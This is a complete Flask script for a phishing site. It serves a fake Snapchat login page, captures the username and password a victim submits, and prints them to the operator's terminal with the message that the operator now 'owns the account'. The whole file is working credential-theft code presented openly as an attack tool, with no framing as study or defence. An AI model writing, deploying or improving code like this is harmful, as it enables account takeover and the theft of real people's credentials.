from flask import Flask, render_template, request, redirect, url_for
import datetime

app = Flask(__name__)


@app.route("/")
def index():
    """Serve the fake Snapchat login page."""
    return render_template("index.html")


@app.route("/login", methods=["POST"])
def login():
    """Capture the victim's username + password, print them to the terminal."""
    username = request.form.get("username", "")
    password = request.form.get("password", "")
    stamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print()
    print("=" * 52, flush=True)
    print("  SNAPCHAT LOGIN — CREDENTIALS CAPTURED", flush=True)
    print("=" * 52, flush=True)
    print(f"  Time        : {stamp}", flush=True)
    print(f"  User/Email  : {username}", flush=True)
    print(f"  Password    : {password}", flush=True)
    print("=" * 52, flush=True)
    print("  Victim is now being signed in -> you own the account.", flush=True)
    print("=" * 52, flush=True)
    print("", flush=True)
    return redirect(url_for("index"))


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080, debug=False)